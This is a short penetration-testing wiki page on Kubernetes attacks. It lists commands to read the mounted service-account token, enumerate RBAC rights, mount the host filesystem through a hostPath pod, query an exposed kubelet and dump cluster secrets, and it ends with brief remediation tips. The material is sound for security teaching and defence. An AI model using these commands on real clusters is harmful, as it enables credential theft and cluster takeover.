---
tags:
  - Cloud
---

# :material-kubernetes: Kubernetes Attacks

<span class="pill pill-hard">cluster takeover</span> <span class="pill pill-info">cloud</span>

A foothold in one pod is rarely the end — service-account tokens, exposed APIs, and permissive RBAC turn a single container into cluster admin.

!!! abstract "TL;DR"
    Grab the mounted service-account token, ask the API what you can do, then abuse a permissive role or a privileged pod spec to reach the node and other tenants.

## :material-magnify: Enumerate from inside a pod

```bash
# Service account token is mounted here by default
cat /var/run/secrets/kubernetes.io/serviceaccount/token
kubectl auth can-i --list                     # what can this SA do?
env | grep KUBERNETES                          # API server address
```

## :material-arrow-up-bold: Common escalations

- **`create pods`** → schedule a pod that mounts the host filesystem:
  ```yaml
  volumes: [{name: h, hostPath: {path: /}}]
  # then chroot /host and read node secrets / kubelet creds
  ```
- **`get secrets`** → dump every credential in the namespace.
- **Privileged / `hostPID` pod** → break to the node → other pods.
- **Exposed kubelet (10250)** → `curl -k https://node:10250/pods` and exec into containers.

!!! loot "Where the keys live"
    `kubectl get secrets -A`, cloud IAM creds via the node metadata endpoint, and etcd (if reachable) = full cluster loot.

## :material-shield-check: Remediation

- Least-privilege RBAC; `automountServiceAccountToken: false` where unused.
- Pod Security admission (no privileged/hostPath); network policies between namespaces.

## :material-link-variant: Related

- Node metadata theft mirrors [SSRF](../web/ssrf.md) → cloud IAM ([AWS](aws.md)).
- Single-container escape → [Container Escape](containers.md).
- Reference: [HackTricks Kubernetes](https://cloud.hacktricks.wiki/).
